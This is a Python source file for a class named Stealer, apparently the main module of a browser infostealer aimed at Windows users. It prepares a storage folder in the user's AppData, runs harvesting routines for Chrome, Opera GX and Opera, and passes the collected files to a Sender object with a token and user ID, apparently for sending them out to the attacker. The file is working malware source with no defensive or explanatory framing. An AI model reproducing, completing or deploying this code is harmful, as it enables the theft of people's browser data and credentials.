from shutil import rmtree
from os import path, mkdir
from threading import Thread

from .modules.sender import Sender
from .browsers.chrome import Chrome
from .browsers.opera_gx import Opera_GX
from .browsers.opera_default import Opera_Default

from getpass import getuser


class Stealer(Thread):

    def __init__(self, token: str, user_id: int):
        Thread.__init__(self, name="Stealer")

        self.token = token
        self.user_id = user_id

        self.user = getuser()
        self.storage_path = f"C:/Users/{self.user}/AppData/"
        self.storage_folder = "files/"

        self.browsers = [
            {
                "method": Chrome(
                    self.storage_path,
                    self.storage_folder
                )
            },
            {
                "method": Opera_GX(
                    self.storage_path,
                    self.storage_folder
                )
            },
            {
                "method": Opera_Default(
                    self.storage_path,
                    self.storage_folder
                )
            }
        ]

    def __create_storage(self):

        if not path.exists(self.storage_path + "files/"):

            mkdir(self.storage_path + "files/")

        else:

            rmtree(self.storage_path + "files/")
            mkdir(self.storage_path + "files/")

    def run(self):

        self.__create_storage()

        for browser in self.browsers:
            browser["method"].run()

        sender = Sender(self.storage_path, self.storage_folder, self.token, self.user_id)
        sender.run()
